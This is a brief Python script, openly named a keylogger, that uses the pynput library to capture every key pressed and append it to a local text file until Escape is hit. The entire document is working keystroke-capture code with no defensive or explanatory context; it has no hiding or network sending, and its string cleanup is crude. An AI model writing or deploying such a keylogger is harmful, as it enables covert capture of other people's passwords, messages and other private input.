from pynput.keyboard import Key, Listener
k=[]
def press(key):
    k.append(key)
    write(k)
    k.clear()
def write(var):
    with open("keylogger.txt","a") as f:
        for i in var:
            nvar=str(var).replace("['","")
            nwvar=str(nvar).replace("']","")
            newvar=str(nwvar).replace("[<Key.space ' '>]"," ")
            f.write(newvar)

def release(k):
    if k == Key.esc:
        return False
with Listener(on_press=press,on_release=release) as l:
    l.join()